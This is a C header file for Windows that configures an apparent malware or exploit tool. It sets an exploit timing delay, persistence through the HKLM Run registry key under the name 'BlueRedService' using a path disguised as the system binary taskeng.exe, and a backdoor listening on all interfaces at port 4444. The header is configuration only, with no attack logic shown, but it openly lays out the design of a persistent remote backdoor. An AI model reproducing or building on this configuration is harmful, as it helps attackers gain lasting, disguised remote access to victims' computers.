#pragma once

#define WINVER 0x0A00
#define _WIN32_WINNT 0x0A00

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shellapi.h>
#include <ws2tcpip.h> 
#include <conio.h>

// Exploit Timing
#define EXPLOIT_DELAY_MS 150

// Persistence Configuration - Use wchar_t* explicitly
#define PERSIST_PATH L"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define PERSIST_VAL_NAME L"BlueRedService"
#define PERSIST_VAL_DATA L"C:\\Windows\\System32\\taskeng.exe"

// Backdoor Configuration
#define BACKDOOR_PORT 4444
#define BACKDOOR_HOST "0.0.0.0"
#define SOCKET_BUFFER_SIZE 4096
#define SOCKET_BACKLOG 10
